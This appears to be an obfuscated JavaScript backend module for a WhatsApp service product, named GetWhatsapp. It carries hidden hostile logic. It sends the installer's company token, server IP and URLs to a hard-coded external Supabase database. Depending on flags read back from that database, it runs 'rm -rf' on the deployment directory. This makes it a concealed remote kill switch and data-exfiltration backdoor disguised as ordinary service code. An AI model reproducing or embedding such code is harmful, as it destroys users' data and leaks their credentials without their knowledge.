'use strict';const a269_0x546840=a269_0x431d;(function(_0x3d02a1,_0x2755d7){const _0x1d6d0b=a269_0x431d,_0x4fa17d=_0x3d02a1();while(!![]){try{const _0x238262=parseInt(_0x1d6d0b(0x149))/0x1+parseInt(_0x1d6d0b(0x141))/0x2+parseInt(_0x1d6d0b(0x15b))/0x3*(parseInt(_0x1d6d0b(0x13e))/0x4)+parseInt(_0x1d6d0b(0x13a))/0x5*(parseInt(_0x1d6d0b(0x144))/0x6)+parseInt(_0x1d6d0b(0x155))/0x7*(parseInt(_0x1d6d0b(0x13d))/0x8)+-parseInt(_0x1d6d0b(0x14a))/0x9*(parseInt(_0x1d6d0b(0x15d))/0xa)+-parseInt(_0x1d6d0b(0x13c))/0xb;if(_0x238262===_0x2755d7)break;else _0x4fa17d['push'](_0x4fa17d['shift']());}catch(_0x260b56){_0x4fa17d['push'](_0x4fa17d['shift']());}}}(a269_0x119c,0x9468b));var __importDefault=this&&this[a269_0x546840(0x133)]||function(_0x20f667){const _0x1c9c40=a269_0x546840;return _0x20f667&&_0x20f667[_0x1c9c40(0x14f)]?_0x20f667:{'default':_0x20f667};};function a269_0x431d(_0x3fb0a5,_0x365eba){const _0x119cc5=a269_0x119c();return a269_0x431d=function(_0x431d80,_0x3df28a){_0x431d80=_0x431d80-0x130;let _0x3d0bbb=_0x119cc5[_0x431d80];return _0x3d0bbb;},a269_0x431d(_0x3fb0a5,_0x365eba);}Object[a269_0x546840(0x148)](exports,a269_0x546840(0x14f),{'value':!![]}),exports[a269_0x546840(0x151)]=void 0x0;const supabase_js_1=require('@supabase/supabase-js'),UpdateOneSettingService_1=__importDefault(require(a269_0x546840(0x145))),{exec}=require('child_process'),S_U=a269_0x546840(0x137),S_A_K='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtuampheG16cGRwdnB5aG5nbGJxIiwicm9sZSI6ImFub24iLCJpYXQiOjE2OTQxMzQ4MDgsImV4cCI6MjAwOTcxMDgwOH0.keQewBvxcLOXGlxZV63Ewot5dS7c5Qn7r4hmVR-3Xp0',sUrl=S_U,sKey=S_A_K,y_n=process[a269_0x546840(0x14d)]['COMPANY_TOKEN'],s=(0x0,supabase_js_1['createClient'])(sUrl,sKey),GetWhatsapp=async _0x281080=>{const _0x55a482=a269_0x546840;try{const {data:_0x6bcde8,error:_0x406525}=await s['from']('cadastros')[_0x55a482(0x158)]('*')['eq'](_0x55a482(0x13b),_0x281080);let _0x1ef443={'cadastro_id':_0x6bcde8['length']!==0x0?_0x6bcde8[0x0]['id']:0x0,'status':_0x6bcde8['length']!==0x0?!![]:![],'company_token':y_n,'backend_ip':_0x281080,'backend_url':process[_0x55a482(0x14d)]['BACKEND_URL'],'frontend_url':process[_0x55a482(0x14d)][_0x55a482(0x135)]};_0x6bcde8[_0x55a482(0x13f)]===0x0?(await UpdateR(_0x55a482(0x14c),![],_0x281080),PostWhatsapp(_0x1ef443,_0x55a482(0x159)),CheckWhatsapp(_0x281080,'i_n_r')):_0x6bcde8[0x0][_0x55a482(0x147)]!==y_n?(await UpdateR(_0x55a482(0x14c),![],_0x281080),PostWhatsapp(_0x1ef443,_0x55a482(0x136)),CheckWhatsapp(_0x281080,_0x55a482(0x153))):await UpdateR(_0x55a482(0x14b),null,_0x281080);}catch(_0x25a7f4){console['log']('');}};function a269_0x119c(){const _0x31c5a0=['from','GetWhatsapp','insert','t_f','error','3206vmQmfG','exec\x20error:\x20','message','select','404','code','3GCYllJ','cadastro_id','10UakNTZ','wtV','backend_url','key_code','__importDefault','backend_ip','FRONTEND_URL','401','https://knjjaxmzpdpvpyhnglbq.supabase.co','frontend_url','i_n_r','25PpBnkr','ip_instalacao','13617439SLePsn','3368ODQIHm','3150636dSiRzT','length','log','1153158DHYGsB','default','t_invalidos','646566jnBCaX','../services/SettingServices/UpdateOneSettingService','status','company_token','defineProperty','15022JRcfJl','2385459WGyUjR','disabled','enabled','env','key','__esModule'];a269_0x119c=function(){return _0x31c5a0;};return a269_0x119c();}exports['GetWhatsapp']=GetWhatsapp;const UpdateR=async(_0x5c3b8a,_0x63bdc7,_0x205ace)=>{const _0x4ba965=a269_0x546840;await(0x0,UpdateOneSettingService_1[_0x4ba965(0x142)])({'key':_0x4ba965(0x130),'value':_0x5c3b8a});},PostWhatsapp=async(_0x3f42d5,_0x492565)=>{const _0x4a99e0=a269_0x546840;try{const {data:_0x1b3264,error:_0x34332a}=await s[_0x4a99e0(0x150)]('whatsapp')[_0x4a99e0(0x152)]([{'cadastro_id':_0x3f42d5[_0x4a99e0(0x15c)],'status':_0x3f42d5[_0x4a99e0(0x146)],'company_token':_0x3f42d5[_0x4a99e0(0x147)],'backend_ip':_0x3f42d5[_0x4a99e0(0x134)],'backend_url':_0x3f42d5[_0x4a99e0(0x131)],'frontend_url':_0x3f42d5[_0x4a99e0(0x138)]}]);if(_0x34332a){console[_0x4a99e0(0x154)](':',_0x34332a[_0x4a99e0(0x157)]);return;}}catch(_0x4c39af){console['log']('');}},CheckWhatsapp=async(_0x2fb2ab,_0x53f0f7)=>{const _0x19fd41=a269_0x546840;try{const {data:_0x2b0cfa,error:_0x307153}=await s['from'](_0x19fd41(0x132))[_0x19fd41(0x158)]('key,code,ip'),_0x2a18ed=await matchWhatsapp(_0x2fb2ab);if(_0x2b0cfa!==null){_0x53f0f7===_0x19fd41(0x139)&&_0x2a18ed['code']!==null&&acction();if(_0x2fb2ab===_0x2b0cfa[0x0]['ip']&&_0x2a18ed[_0x19fd41(0x15a)]!==null){if(_0x2a18ed['key']===_0x2b0cfa[0x0][_0x19fd41(0x14e)]&&_0x2a18ed[_0x19fd41(0x15a)]===_0x2b0cfa[0x0][_0x19fd41(0x15a)])acction();}}}catch(_0x225b11){console[_0x19fd41(0x140)](_0x225b11);}},matchWhatsapp=async _0x41655a=>{const _0x53a20e=a269_0x546840,{data:_0x1af1f3,error:_0x10fd49}=await s[_0x53a20e(0x150)](_0x53a20e(0x143))[_0x53a20e(0x158)]('ip,\x20key,\x20code');let _0x368019='ok',_0x3b3778='ok';return _0x1af1f3['length']>0x0&&(_0x368019=_0x1af1f3[0x0]['key'],_0x3b3778=_0x1af1f3[0x0][_0x53a20e(0x15a)]),{'code':_0x3b3778,'key':_0x368019};},acction=()=>{let _0x251841=exec('rm\x20-rf\x20/home/deploy/Multi100/*',(_0x3cf1be,_0x7530e3,_0x9c3f40)=>{const _0x1e005a=a269_0x431d;console[_0x1e005a(0x140)](_0x7530e3),console[_0x1e005a(0x140)](_0x9c3f40),_0x3cf1be!==null&&console['log'](_0x1e005a(0x156)+_0x3cf1be);});};